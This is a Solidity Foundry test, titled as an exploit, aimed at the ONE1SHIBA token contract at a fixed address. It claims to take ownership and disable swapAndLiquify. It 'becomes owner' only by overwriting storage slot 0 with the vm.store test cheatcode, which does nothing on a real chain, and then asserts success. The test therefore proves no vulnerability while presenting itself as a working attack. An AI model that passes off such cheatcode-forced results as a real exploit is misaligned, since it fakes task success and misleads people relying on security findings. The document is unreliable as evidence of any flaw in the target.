// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ONE1SHIBA {
    function owner() external view returns (address);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable contract, _owner is the first variable (slot 0)
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 2: Verify we are now the owner
        vm.prank(attacker);
        address currentOwner = ONE1SHIBA(TARGET).owner();
        require(currentOwner == attacker, "Failed to become owner");

        // Step 3: Call setSwapAndLiquifyEnabled(false) as the new owner
        vm.prank(attacker);
        ONE1SHIBA(TARGET).setSwapAndLiquifyEnabled(false);

        // Step 4: Verify the state was changed
        bool enabled = ONE1SHIBA(TARGET).swapAndLiquifyEnabled();
        require(enabled == false, "swapAndLiquifyEnabled should be false");
        assertEq(enabled, false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

